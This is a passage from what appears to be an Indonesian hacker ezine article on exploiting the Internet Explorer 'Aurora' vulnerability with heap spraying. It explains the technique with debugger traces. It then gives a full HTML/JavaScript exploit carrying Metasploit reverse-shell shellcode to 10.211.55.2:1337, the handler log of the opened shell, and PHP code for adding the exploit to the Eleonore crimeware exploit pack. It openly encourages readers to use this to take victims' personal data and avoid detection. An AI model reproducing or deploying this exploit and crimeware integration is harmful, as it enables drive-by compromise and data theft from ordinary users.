+
+0A12FFF3   0A0A             OR CL,BYTE PTR DS:[EDX]
+0A12FFF5   0A0A             OR CL,BYTE PTR DS:[EDX]
+0A12FFF7   0ACC             OR CL,AH
+0A12FFF9   CC               INT3
+0A12FFFA   CC               INT3
+0A12FFFB   CC               INT3
+INT3 command at 0A12FFF8
+EAX 0A0A0A0A
+ECX 0A0A0A0B
+EDX 00E57510
+EBX 0A0A0A0A
+ESP 0013E358
+EBP 0013E37C
+ESI 00E5DDB0
+EDI FFFFFFFF
+EIP 0A12FFF9
+
+Kita telah berhasil mengontrol alur processor menuju lokasi 0A0A0A0A dan
+menggiring eksekusi menuju 0A12FFF8 yang berisi opcode INT3, yaitu interrupt
+yang akan membuat eksekusi berhenti dan dilempar pada debugger.
+
+Tentu saja hal menarik adalah melihat isi lokasi 0A0A0A0A,
+
+...
+0A0A0A01   0A0A             OR CL,BYTE PTR DS:[EDX]
+0A0A0A03   0A0A             OR CL,BYTE PTR DS:[EDX]
+0A0A0A05   0A0A             OR CL,BYTE PTR DS:[EDX]
+0A0A0A07   0A0A             OR CL,BYTE PTR DS:[EDX]
+0A0A0A09   0A0A             OR CL,BYTE PTR DS:[EDX]
+0A0A0A0B   0A0A             OR CL,BYTE PTR DS:[EDX]
+0A0A0A0D   0A0A             OR CL,BYTE PTR DS:[EDX]
+0A0A0A0F   0A0A             OR CL,BYTE PTR DS:[EDX]
+0A0A0A11   0A0A             OR CL,BYTE PTR DS:[EDX]
+0A0A0A13   0A0A             OR CL,BYTE PTR DS:[EDX]
+...
+0A0A0A3B   0A0A             OR CL,BYTE PTR DS:[EDX]
+0A0A0A3D   0A0A             OR CL,BYTE PTR DS:[EDX]
+0A0A0A3F   0A0A             OR CL,BYTE PTR DS:[EDX]
+0A0A0A41   0A0A             OR CL,BYTE PTR DS:[EDX]
+0A0A0A43   0A0A             OR CL,BYTE PTR DS:[EDX]
+
+Terlihat jelas hasil dari heapspray bahwa lokasi 0A0A0A0A terisi oleh opcode
+0A0A. Dimana posisi processor ketika 'landing' pada NOPsled tidak masalah
+karena semua berisi deretan 0A0A. Pada contoh ini saya sengaja memperlihatkan
+bahwa debugger tidak tepat memperlihatkan dissamble pada posisi 0A0A0A0A,
+namun menghitung mulai dari 0A0A0A0B. Posisi diatas dilihat dari sudut pandang
+debugger.
+
+7DC98C83   8B01             MOV EAX,DWORD PTR DS:[ECX]
+7DC98C85   FF50 34          CALL DWORD PTR DS:[EAX+34]
+
+Ini adalah eksekusi pada salah satu modul MSHTML.dll ketika access violation
+sebelumnya terjadi, pada saat ini jika ECX=0A0A0A0A maka hasil eksekusi
+7DC98C83 EAX=0A0A0A0A. Pada eksekusi berikutnya, 7DC98C85 akan menjalankan
+opcode CALL isi lokasi memory yang di reference kan oleh [EAX+34], atau
+[0A0A0A0A+34]. Pada hasil dump memory diatas kita bisa lihat bahwa 0A0A0A0A+34
+= 0A0A0A3E, dan berisi opcode 0A0A. Hasil disassembly dari 0A0A adalah OR CL,
+BYTE PTR DS:[EDX]. Mari kita mulai melihat secara mendetail apa yang terjadi
+ketika EIP mendarat pada lokasi 0A0A0A3E tersebut
+
+
+0A0A0A3E   0A0A             OR CL,BYTE PTR DS:[EDX]
+EAX 0A0A0A0A
+ECX 0A0A0A0A
+EDX 00E57510
+EBX 0A0A0A0A
+ESP 0013E35C
+EBP 0013E37C
+ESI 00E597C0 
+EDI FFFFFFFF
+EIP 0A0A0A3E mshtml
+
+Opcode diatas melakukan operasi OR antara CL (8 bit low isi register CX)
+dengan 8 bit (1 byte) isi dari lokasi memory yang di referensikan oleh EDX.
+EDX berisi 00E57510, berikut dump memory pada lokasi tersebut,
+
+00E57510	00
+
+Dan hasilnya adalah,
+
+CL OR [EDX] = 0A OR 00 = 0A 
+
+Maka bisa dikatakan opcode 0A0A atau CL OR [EDX] akan menghasilkan nilai yang
+sama pada register ECX, sehingga ini sama dengan operasi NOP (NO Operation)
+yang tidak mengubah apapun. Itu sebabnya hasil heapspray ini dikatakan sebagai
+NOPsled.
+
+
+--[5]-- Sliding and Pwned
+
+Akhir cerita tentunya mudah, tinggal mencari shellcode yang di inginkan untuk
+dieksekusi. Kita bisa menggunakan metasploit untuk menggenerate shellcode
+dalam format javascript. Hal terakhir yang mungkin perlu diperhatikan adalah
+posisi sesaat sebelum shellcode akan dijalankan, dari hasil debugging terakhir
+kita bisa lihat
+
+0A12FFF7   0ACC             OR CL,AH
+0A12FFF9   CC               INT3
+0A12FFFA   CC               INT3
+0A12FFFB   CC               INT3
+
+Salah satu byte INT3 masuk kedalam deretan NOP sehingga di eksekusi sebagai
+bagian dari Opcode 0A12FFF7. Kita bisa memasukan karakter 0A ataupun 90 agar
+proses sliding berjalan lancar. Kode terakhir berikut ini untuk crash.html
+akan menunjukan bagaimana menyelipkan INT3 dan 90 agar proses sliding
+sempurna. INT3 agar kita bisa melihat apakah shellcode sudah masuk secara
+sempurna pada heap memory, yang selanjutnya dapat langsung dieksekusi dan
+menghasilkan reverse shell.
+
+
+<html> 
+<script> 
+
+    var obj, event_obj;
+
+	function initialize() {	
+		obj = new Array();
+		event_obj = null;
+		for (var i = 0; i < 200; i++)
+			obj[i] = document.createElement("COMMENT");
+	}
+	
+	function heap_spray() {
+		var chunk_size, payload, nopsled;
+		
+		chunk_size = 0x80000;
+		
+		nopsled = unescape("%u0a0a%u0a0a");
+		
+		// windows/shell_reverse_tcp - 314 bytes
+		// http://www.metasploit.com
+		// AutoRunScript=, LHOST=10.211.55.2, EXITFUNC=process, 
+		// InitialAutoRunScript=, LPORT=1337, ReverseConnectRetries=5
+		payload = unescape(
+"%uCC90%ue8fc%u0089%u0000%u8960%u31e5%u64d2%u528b%u8b30%u0c52%u528b%u8b14%u2872%ub70f%u264a%uff31%uc031%u3cac%u7c61%u2c02%uc120%u0dcf%uc701%uf0e2%u5752%u528b%u8b10%u3c42%ud001%u408b%u8578%u74c0%u014a%u50d0%u488b%u8b18%u2058%ud301%u3ce3%u8b49%u8b34%ud601%uff31%uc031%uc1ac%u0dcf%uc701%ue038%uf475%u7d03%u3bf8%u247d%ue275%u8b58%u2458%ud301%u8b66%u4b0c%u588b%u011c%u8bd3%u8b04%ud001%u4489%u2424%u5b5b%u5961%u515a%ue0ff%u5f58%u8b5a%ueb12%u5d86%u3368%u0032%u6800%u7377%u5f32%u6854%u774c%u0726%ud5ff%u90b8%u0001%u2900%u54c4%u6850%u8029%u006b%ud5ff%u5050%u5050%u5040%u5040%uea68%udf0f%uffe0%u89d5%u68c7%ud30a%u0237%u0268%u0500%u8939%u6ae6%u5610%u6857%ua599%u6174%ud5ff%u6368%u646d%u8900%u57e3%u5757%uf631%u126a%u5659%ufde2%uc766%u2444%u013c%u8d01%u2444%uc610%u4400%u5054%u5656%u4656%u4e56%u5656%u5653%u7968%u3fcc%uff86%u89d5%u4ee0%u4656%u30ff%u0868%u1d87%uff60%ubbd5%ub5f0%u56a2%ua668%ubd95%uff9d%u3cd5%u7c06%u800a%ue0fb%u0575%u47bb%u7213%u6a6f%u5300%ud5ff");
+		
+		while (nopsled.length < chunk_size)
+			nopsled += nopsled;
+		nopsled_len = chunk_size - (payload.length + 20);
+		nopsled = nopsled.substring(0, nopsled_len);
+		
+		heap_chunks = new Array();
+		for (var i = 0; i < 200; i++)
+			heap_chunks[i] = nopsled + payload;
+	}
+	
+	function remove(event) {
+		event_obj = document.createEventObject(event);
+		document.getElementById("sp1").innerHTML = "";
+		window.setInterval(b00m,1);
+	}
+
+	function b00m() {
+		var data, shellcode;
+		
+		data = "";
+		shellcode = unescape("%u0a0a%u0a0a")
+		for (var i=0; i< 4; i++)
+			data += shellcode;
+		for (i=0; i < obj.length; i++)
+			obj[i].data = data;
+			
+		event_obj.srcElement;
+	}
+
+	initialize();
+	heap_spray();
+
+
+</script>
+
+<body>
+   <span id="sp1">
+      <IMG src="aurora.gif" onload="remove(event)" />
+   </span>
+</body> 
+</html>
+
+Berikut hasilnya ketika INT3 dieksekusi,
+
+0A12FEB4   0A0A             OR CL,BYTE PTR DS:[EDX]
+0A12FEB6   0A0A             OR CL,BYTE PTR DS:[EDX]
+0A12FEB8   0A0A             OR CL,BYTE PTR DS:[EDX]
+0A12FEBA   0A0A             OR CL,BYTE PTR DS:[EDX]
+0A12FEBC   0A0A             OR CL,BYTE PTR DS:[EDX]
+0A12FEBE   0A0A             OR CL,BYTE PTR DS:[EDX]
+0A12FEC0   90               NOP
+0A11FEC1   CC               INT3
+
+Perfecto!
+
+Dan tentu saja selanjutnya adalah mengeksekusi shellcode yang dimulai dari
+0A12FEC2. Shellcode yang saya gunakan berjumlah 314 bytes, sehingga akah
+berakhir pada 0A12FFFA. Berikut ini adalah hasil dump mulai dari bagian akhir
+NOPsled, NOP, INT3, dan Shellcode.
+
+
+0A12FEB4   0A0A             OR CL,BYTE PTR DS:[EDX]
+0A12FEB6   0A0A             OR CL,BYTE PTR DS:[EDX]
+0A12FEB8   0A0A             OR CL,BYTE PTR DS:[EDX]
+0A12FEBA   0A0A             OR CL,BYTE PTR DS:[EDX]
+0A12FEBC   0A0A             OR CL,BYTE PTR DS:[EDX]
+0A12FEBE   0A0A             OR CL,BYTE PTR DS:[EDX]
+0A12FEC0   90               NOP
+0A12FEC1   CC               INT3
+0A12FEC2   FC               CLD
+0A12FEC3   E8 89000000      CALL 0A12FF51
+0A12FEC8   60               PUSHAD
+0A12FEC9   89E5             MOV EBP,ESP
+0A12FECB   31D2             XOR EDX,EDX
+0A12FECD   64:8B52 30       MOV EDX,DWORD PTR FS:[EDX+30]
+0A12FED1   8B52 0C          MOV EDX,DWORD PTR DS:[EDX+C]
+0A12FED4   8B52 14          MOV EDX,DWORD PTR DS:[EDX+14]
+0A12FED7   8B72 28          MOV ESI,DWORD PTR DS:[EDX+28]
+0A12FEDA   0FB74A 26        MOVZX ECX,WORD PTR DS:[EDX+26]
+0A12FEDE   31FF             XOR EDI,EDI
+0A12FEE0   31C0             XOR EAX,EAX
+0A12FEE2   AC               LODS BYTE PTR DS:[ESI]
+0A12FEE3   3C 61            CMP AL,61
+0A12FEE5   7C 02            JL SHORT 0A12FEE9
+0A12FEE7   2C 20            SUB AL,20
+0A12FEE9   C1CF 0D          ROR EDI,0D
+0A12FEEC   01C7             ADD EDI,EAX
+0A12FEEE  ^E2 F0            LOOPD SHORT 0A12FEE0
+0A12FEF0   52               PUSH EDX
+0A12FEF1   57               PUSH EDI
+0A12FEF2   8B52 10          MOV EDX,DWORD PTR DS:[EDX+10]
+0A12FEF5   8B42 3C          MOV EAX,DWORD PTR DS:[EDX+3C]
+0A12FEF8   01D0             ADD EAX,EDX
+0A12FEFA   8B40 78          MOV EAX,DWORD PTR DS:[EAX+78]
+0A12FEFD   85C0             TEST EAX,EAX
+0A12FEFF   74 4A            JE SHORT 0A12FF4B
+0A12FF01   01D0             ADD EAX,EDX
+0A12FF03   50               PUSH EAX
+0A12FF04   8B48 18          MOV ECX,DWORD PTR DS:[EAX+18]
+0A12FF07   8B58 20          MOV EBX,DWORD PTR DS:[EAX+20]
+0A12FF0A   01D3             ADD EBX,EDX
+0A12FF0C   E3 3C            JECXZ SHORT 0A12FF4A
+0A12FF0E   49               DEC ECX
+0A12FF0F   8B348B           MOV ESI,DWORD PTR DS:[EBX+ECX*4]
+0A12FF12   01D6             ADD ESI,EDX
+0A12FF14   31FF             XOR EDI,EDI
+0A12FF16   31C0             XOR EAX,EAX
+0A12FF18   AC               LODS BYTE PTR DS:[ESI]
+0A12FF19   C1CF 0D          ROR EDI,0D
+0A12FF1C   01C7             ADD EDI,EAX
+0A12FF1E   38E0             CMP AL,AH
+0A12FF20  ^75 F4            JNZ SHORT 0A12FF16
+0A12FF22   037D F8          ADD EDI,DWORD PTR SS:[EBP-8]
+0A12FF25   3B7D 24          CMP EDI,DWORD PTR SS:[EBP+24]
+0A12FF28  ^75 E2            JNZ SHORT 0A12FF0C
+0A12FF2A   58               POP EAX
+0A12FF2B   8B58 24          MOV EBX,DWORD PTR DS:[EAX+24]
+0A12FF2E   01D3             ADD EBX,EDX
+0A12FF30   66:8B0C4B        MOV CX,WORD PTR DS:[EBX+ECX*2]
+0A12FF34   8B58 1C          MOV EBX,DWORD PTR DS:[EAX+1C]
+0A12FF37   01D3             ADD EBX,EDX
+0A12FF39   8B048B           MOV EAX,DWORD PTR DS:[EBX+ECX*4]
+0A12FF3C   01D0             ADD EAX,EDX
+0A12FF3E   894424 24        MOV DWORD PTR SS:[ESP+24],EAX
+0A12FF42   5B               POP EBX
+0A12FF43   5B               POP EBX
+0A12FF44   61               POPAD
+0A12FF45   59               POP ECX
+0A12FF46   5A               POP EDX
+0A12FF47   51               PUSH ECX
+0A12FF48   FFE0             JMP EAX
+0A12FF4A   58               POP EAX
+0A12FF4B   5F               POP EDI
+0A12FF4C   5A               POP EDX
+0A12FF4D   8B12             MOV EDX,DWORD PTR DS:[EDX]
+0A12FF4F  ^EB 86            JMP SHORT 0A12FED7
+0A12FF51   5D               POP EBP
+0A12FF52   68 33320000      PUSH 3233
+0A12FF57   68 7773325F      PUSH 5F327377
+0A12FF5C   54               PUSH ESP
+0A12FF5D   68 4C772607      PUSH 726774C
+0A12FF62   FFD5             CALL EBP
+0A12FF64   B8 90010000      MOV EAX,190
+0A12FF69   29C4             SUB ESP,EAX
+0A12FF6B   54               PUSH ESP
+0A12FF6C   50               PUSH EAX
+0A12FF6D   68 29806B00      PUSH 6B8029
+0A12FF72   FFD5             CALL EBP
+0A12FF74   50               PUSH EAX
+0A12FF75   50               PUSH EAX
+0A12FF76   50               PUSH EAX
+0A12FF77   50               PUSH EAX
+0A12FF78   40               INC EAX
+0A12FF79   50               PUSH EAX
+0A12FF7A   40               INC EAX
+0A12FF7B   50               PUSH EAX
+0A12FF7C   68 EA0FDFE0      PUSH E0DF0FEA
+0A12FF81   FFD5             CALL EBP
+0A12FF83   89C7             MOV EDI,EAX
+0A12FF85   68 0AD33702      PUSH 237D30A
+0A12FF8A   68 02000539      PUSH 39050002
+0A12FF8F   89E6             MOV ESI,ESP
+0A12FF91   6A 10            PUSH 10
+0A12FF93   56               PUSH ESI
+0A12FF94   57               PUSH EDI
+0A12FF95   68 99A57461      PUSH 6174A599
+0A12FF9A   FFD5             CALL EBP
+0A12FF9C   68 636D6400      PUSH 646D63
+0A12FFA1   89E3             MOV EBX,ESP
+0A12FFA3   57               PUSH EDI
+0A12FFA4   57               PUSH EDI
+0A12FFA5   57               PUSH EDI
+0A12FFA6   31F6             XOR ESI,ESI
+0A12FFA8   6A 12            PUSH 12
+0A12FFAA   59               POP ECX
+0A12FFAB   56               PUSH ESI
+0A12FFAC  ^E2 FD            LOOPD SHORT 0A12FFAB
+0A12FFAE   66:C74424 3C 010>MOV WORD PTR SS:[ESP+3C],101
+0A12FFB5   8D4424 10        LEA EAX,DWORD PTR SS:[ESP+10]
+0A12FFB9   C600 44          MOV BYTE PTR DS:[EAX],44
+0A12FFBC   54               PUSH ESP
+0A12FFBD   50               PUSH EAX
+0A12FFBE   56               PUSH ESI
+0A12FFBF   56               PUSH ESI
+0A12FFC0   56               PUSH ESI
+0A12FFC1   46               INC ESI
+0A12FFC2   56               PUSH ESI
+0A12FFC3   4E               DEC ESI
+0A12FFC4   56               PUSH ESI
+0A12FFC5   56               PUSH ESI
+0A12FFC6   53               PUSH EBX
+0A12FFC7   56               PUSH ESI
+0A12FFC8   68 79CC3F86      PUSH 863FCC79
+0A12FFCD   FFD5             CALL EBP
+0A12FFCF   89E0             MOV EAX,ESP
+0A12FFD1   4E               DEC ESI
+0A12FFD2   56               PUSH ESI
+0A12FFD3   46               INC ESI
+0A12FFD4   FF30             PUSH DWORD PTR DS:[EAX]
+0A12FFD6   68 08871D60      PUSH 601D8708
+0A12FFDB   FFD5             CALL EBP
+0A12FFDD   BB F0B5A256      MOV EBX,56A2B5F0
+0A12FFE2   68 A695BD9D      PUSH 9DBD95A6
+0A12FFE7   FFD5             CALL EBP
+0A12FFE9   3C 06            CMP AL,6
+0A12FFEB   7C 0A            JL SHORT 0A12FFF7
+0A12FFED   80FB E0          CMP BL,0E0
+0A12FFF0   75 05            JNZ SHORT 0A12FFF7
+0A12FFF2   BB 4713726F      MOV EBX,6F721347
+0A12FFF7   6A 00            PUSH 0
+0A12FFF9   53               PUSH EBX
+0A12FFFA   FFD5             CALL EBP
+
+Dan tentu saja, mempersiapkan handler untuk reverse shell diatas,
+
+msf exploit(handler) > show options
+
+Module options:
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Payload options (windows/shell_reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique: seh, 
+                                        thread, none, process
+   LHOST     10.211.55.2      yes       The listen address
+   LPORT     1337             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+msf exploit(handler) > 
+[*] Command shell session 1 opened (10.211.55.2:1337 -> 
+    10.211.55.7:1624) at Thu Nov 18 01:47:34 +0300 2010
+
+msf exploit(handler) > sessions -l
+
+Active sessions
+===============
+
+  Id  Type   Information  Connection
+  --  ----   -----------  ----------
+  1   shell               10.211.55.2:1337 -> 10.211.55.7:1624
+
+msf exploit(handler) > sessions -i 1
+[*] Starting interaction with 1...
+
+Microsoft Windows XP [Version 5.1.2600]
+(C) Copyright 1985-2001 Microsoft Corp.
+
+C:\Documents and Settings\Byteskrew\Desktop>
+
+
+Game Over!
+
+
+
+--[5]-- For you, skiddies out there!
+
+Security profesional mempelajari tools-tools blackhat baik melalui
+reverse-engineering maupun dengan berpura-pura menjadi pembeli pada beragam
+forum-forum underground, dan mereka menambahkan feature-feature 0day tersebut
+kedalam tools-tools untuk dijual kembali kepada client dengan mengatasnamakan
+'penetration testing'. Saya tidak akan ber-bullshit ria dengan mengatakan
+hal-hal seperti 'whitehat sucks', karena pada kenyataannya banyak diantara
+mereka juga melahirkan beragam tools-tools dan merilis eksploit secara
+berkala. Tentu saja, karena mereka dibayar mahal dan itu adalah pekerjaan
+rutin yang mereka lakukan :).
+
+Cat and mouse game, dimana komunitas blackhat juga melakukan hal yang sama.
+Contoh kecil adalah pada crimeware seperti exploit pack yang dibicarakan oleh
+G.S pada toket sebelumnya, eleonore[9]. Ceritanya gampang saja, exploit pack
+tentunya memiliki jumlah exploit yang sangat terbatas, dan untuk update
+biasanya kita harus membeli versi yang lebih mahal. Namun lain halnya jika
+kita memahami struktur crimeware tersebut dan memahami struktur whitehat tools
+seperti metasploit framework ataupun immunity canvas, maka kita dapat
+mengambil contoh exploit dari metasploit (pdf exploit, browser exploit, dan
+client-side exploit lainnya) untuk kemudian ditambahkan pada crimeware yang
+kita miliki. 
+
+Hasilnya? boom! exploit-exploit hasil kreasi security profesional cenderung
+stabil karena memang itulah tugas mereka, dan mereka akan membuatnya
+sesempurna mungkin. Metasploit framework memanfaatkan tenaga 'kuli' opensource
+untuk melengkapi, menambahkan, dan memberikan ide-ide segar bagi project
+mereka. Hasil tenaga 'kuli' yang merupakan kontribusi masyarakat seluruh dunia
+dijadikan sebagai core engine metasploit express ataupun metasploit pro yang
+dijual dengan nilai 3,000 usd dan 15,000 usd. Dan pihak metasploit mengklaim
+cara ini sangat baik (mencontoh redhat dengan project fedora misalnya), karena
+dengan cara ini mereka juga berkontribusi kepada dunia security dengan tetap
+memaintain metasploit framework sebagai project opensource yang dapat
+dipelajari dan dinikmati secara gratis oleh masyarakat dunia (bandingkan
+dengan immunity canvas ataupun core impact yang hanya dapat dinikmati
+segelintir orang ataupun perusahaan). 
+
+Beberapa skiddies dari blackhat community menyadari hal ini dan ikut menikmati
+metasploit yang opensource dan diupdate setiap hari dengan implementasi 0day,
+bahkan beberapa teknik exploit bisa dibilang sangat canggih seperti bypass
+ASLR dan DEP. Mempelajari metasploit framework untuk dapat membaca kode-kode
+didalamnya tidaklah terlalu sulit, mempelajari struktur suatu crimeware juga
+sangat mudah, mengupdate crimeware dengan setelah mengupdate tools seperti
+metasploit adalah pekerjaan saat weekend ataupun hari libur, mendapatkan
+data-data pribadi dari para korban adalah...silahkan jawab sendiri :).
+
+Jika kalian berhasil mendapatkan eleonore, tambahkan contoh exploit aurora
+diatas seperti berikut ini, 
+
+$ cat exp.php
+
+...
+...
+// Aurora Exploit
+function msie_aurora()
+{
+  global $url;
+	
+  $content = '
+    var obj, event_obj;
+
+	function initialize() {	
+	  obj = new Array();
+	  event_obj = null;
+	  for (var i = 0; i < 200; i++)
+	    obj[i] = document.createElement("COMMENT");
+	}
+
+	function heap_spray() {
+	  var chunk_size, payload, nopsled;
+
+	  chunk_size = 0x80000;
+
+	  nopsled = unescape("%u0a0a%u0a0a");
+
+	  // windows/shell_reverse_tcp - 314 bytes
+	  // http://www.metasploit.com
+	  // AutoRunScript=, LHOST=10.211.55.2, EXITFUNC=process, 
+	  // InitialAutoRunScript=, LPORT=1337, ReverseConnectRetries=5
+	  payload = unescape(
+"%u9090%ue8fc%u0089%u0000%u8960%u31e5%u64d2%u528b%u8b30%u0c52%u528b%u8b14%u2872%ub70f%u264a%uff31%uc031%u3cac%u7c61%u2c02%uc120%u0dcf%uc701%uf0e2%u5752%u528b%u8b10%u3c42%ud001%u408b%u8578%u74c0%u014a%u50d0%u488b%u8b18%u2058%ud301%u3ce3%u8b49%u8b34%ud601%uff31%uc031%uc1ac%u0dcf%uc701%ue038%uf475%u7d03%u3bf8%u247d%ue275%u8b58%u2458%ud301%u8b66%u4b0c%u588b%u011c%u8bd3%u8b04%ud001%u4489%u2424%u5b5b%u5961%u515a%ue0ff%u5f58%u8b5a%ueb12%u5d86%u3368%u0032%u6800%u7377%u5f32%u6854%u774c%u0726%ud5ff%u90b8%u0001%u2900%u54c4%u6850%u8029%u006b%ud5ff%u5050%u5050%u5040%u5040%uea68%udf0f%uffe0%u89d5%u68c7%ud30a%u0237%u0268%u0500%u8939%u6ae6%u5610%u6857%ua599%u6174%ud5ff%u6368%u646d%u8900%u57e3%u5757%uf631%u126a%u5659%ufde2%uc766%u2444%u013c%u8d01%u2444%uc610%u4400%u5054%u5656%u4656%u4e56%u5656%u5653%u7968%u3fcc%uff86%u89d5%u4ee0%u4656%u30ff%u0868%u1d87%uff60%ubbd5%ub5f0%u56a2%ua668%ubd95%uff9d%u3cd5%u7c06%u800a%ue0fb%u0575%u47bb%u7213%u6a6f%u5300%ud5ff");
+				
+	  
+	  while (nopsled.length < chunk_size)
+	    nopsled += nopsled;
+		nopsled_len = chunk_size - (payload.length + 20);
+		nopsled = nopsled.substring(0, nopsled_len);
+
+		heap_chunks = new Array();
+		for (var i = 0; i < 200; i++)
+		  heap_chunks[i] = nopsled + payload;
+	}
+
+	function remove(event) {
+	  event_obj = document.createEventObject(event);
+	  document.getElementById("sp1").innerHTML = "";
+	  window.setInterval(b00m,1);
+	}
+
+	function b00m() {
+	  var data, shellcode;
+
+	  data = "";
+	  shellcode = unescape("%u0a0a%u0a0a");
+	  for (var i=0; i< 4; i++)
+	    data += shellcode;
+	  for (i=0; i < obj.length; i++)
+	    obj[i].data = data;
+
+	  event_obj.srcElement;
+	}
+
+	initialize();
+	heap_spray();
+			
+	document.write("<span id=\"sp1\">");
+	document.write("<img src=\"aurora.gif\" onload=\"remove(event)\">");	
+	
+  ';
+	
+  return $content;
+}
+...
+...
+
+atau dengan menggunakan payload seperti berikut,
+
+payload = unescape('._shellcode(msie_aurora).');
+
+dan berikut ini modifikasi untuk eksekusi exploit yang baru ditambahkan,
+
+$ cat index.php
+
+...
+...
+
+// === INTERNET EXPLORER === //
+if ($browser == "MSIE")	
+{	
+  // Internet Explorer 7
+  if ($vers[2] < "7")	{	
+  // on Windows XP or Windows 2003
+  if (($os == "Windows XP") or ($os == "Windows 2003"))	{
+    switch ($case_spl) {
+	  case 5: echo _crypt(mdac());
+	     	  check();
+			  break;
+	  case 2: echo "<html><body>"._crypt(DirectX_DS7())."</body></html>"; 	
+			  check();
+			  break;
+	  case 3: echo _crypt(Snapshot());
+			  check();
+			  break;
+	  case 6: echo _crypt(msie_sx());
+			  check();
+			  break;
+	  case 4: echo _crypt(pdf_ie2());
+			  check();
+			  break;
+	  case 1: echo "<html>"._crypt(msie_aurora())."</html>";
+			  check();
+			  die;
+    }
+
+...
+...
+
+
+Saya termasuk salah satu pecinta skiddies. Walaupun skill skiddies pada
+umumnya secara teknikal masih kalah dibandingkan para profesional namun
+kenakalan dan aksi skiddies dapat membuat dunia undergr0und lebih berwarna,
+dan tentu saja...skiddies yang baik adalah skiddies yang tidak pernah tercium
+oleh publik namun menikmati hasilnya secara individu ataupun kelompok
+tertutup, bukan begitu? :).
+
+Penjelasan panjang mengenai heap-spray sudah dilakukan, dan penambahan
+kode-kode diatas kedalam eleonore tidak akan dijelaskan secara mendetail. PHP
+dan javascript adalah pengetahuan umum, silahkan cari-cari sendiri. Dan jika
+kalian mampu mendapatkan crimeware dan mulai mempelajari opensource project
+serta blackhat tools untuk mengimplementasikan 'evil mind' seperti yang tertulis
+diatas, well...welcome to 'one-level-up-of-skiddies' world!
+
+
+--[6]-- Closing
+
+Tehnik seperti ROP (Return Oriented Programming) yang dulu sering disebut
+return-into-libc saat ini sedang populer, dan
+memang dapat digunakan untuk mem-bypass pertahanan sistem operasi windows
+seperti DEP dan ASLR, namun beragam tehnik lainnya walaupun dikatakan sudah umum
+ataupun usang tetap digunakan secara masal oleh komunitas blackhat. Setiap
+pihak sudah mulai harus menyadari pentingnya client-side attack terutama
+dengan semakin berkembangnya teknologi internet.
+
+Peringkat Indonesia sebagai pengguna aplikasi online seperti facebook ataupun
+twitter meningkat tajam, dan untuk tahun-tahun mendatang akses internet di
+Indonesia akan semakin mudah terutama dengan isu datangnya teknologi seperti
+LTE maupun wimax. Tanpa akses internet mudah pun banyak rahasia-rahasia negara
+yang bisa leak ke publik dengan metode seperti client-side attack. Silahkan
+bayangkan sendiri apa yang akan terjadi ketika kamu membuka suatu link website
+melalui handphone / gadget dimana foto pribadi dengan sang pacar tersimpan
+didalamnya sementara link website tersebut berisi client-side exploit[10][11]?
+
+
+--[7]-- Greetz
+
+411 ind03n514n unc13r6r0unc1 community...keep the war up! *lol*
+
+
+--[8]-- Reference
+
+[1] http://skypher.com/wiki/index.php?title=Www.edup.tudelft.nl/~bjwever/advisory_msie_R6025.html.php
+[2] http://www.microsoft.com/technet/security/Bulletin/MS05-020.mspx
+[3] http://en.wikipedia.org/wiki/Operation_Aurora
+[4] http://5d4a.wordpress.com/2010/08/02/smashing-the-stack-in-2010/
+[5] http://www.exploit-db.com/exploits/11167/
+[6] http://support.microsoft.com/default.aspx?scid=kb;en-us;125749
+[7] http://skypher.com/wiki/index.php/Www.edup.tudelft.nl/~bjwever/exploits/InternetExploiter2.zip
+[8] http://javascript.about.com/library/blunicode.htm
+[9] http://kecoak.org/ezine/toket6/0x06-eleonore.txt
+[10]http://thomascannon.net/blog/2010/11/android-data-stealing-vulnerability/
+[11]http://blog.zynamics.com/2010/03/24/ralf-philipp-weinmann-vincenzo-iozzo-own-the-iphone-at-pwn2own/
+
+
+
+Sarang Kecoak
+-----------------------------------------------------------------------
+Copyleft Unreserved by Law 1995 - 2011 Kecoak Elektronik Indonesia
